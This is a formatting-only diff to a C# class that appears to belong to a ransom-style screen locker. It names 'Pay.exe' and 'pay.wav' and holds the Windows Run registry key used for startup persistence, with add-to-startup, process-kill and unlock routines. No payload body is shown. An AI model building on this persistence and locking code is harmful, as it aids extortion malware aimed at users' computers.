@@ -13,18 +13,12 @@ namespace M_Engine
         public const string a = "Pay.exe";
         public const string s = "pay.wav";
         private const string rsk = @"SOFTWARE\Microsoft\Windows\CurrentVersion\Run";
-
-        static Handle()
-        {
-            InitializePaths();
-        }
-
+        static Handle() { InitializePaths(); }
         private static void InitializePaths()
         {
             ad = Environment.CurrentDirectory;
             ap = Path.Combine(ad, a);
         }
-
         public static void adtsup()
         {
             try
@@ -114,12 +108,5 @@ namespace M_Engine
                 Debug.WriteLine($"General error in KillProcess: {ex.Message}");
             }
         }
-
         public static void UnlockApplication()
-        {
-            kill(a);
-            rmvstup();
-            Application.Exit();
-        }
-    }
-}
+        { kill(a); rmvstup(); Application.Exit(); }}}
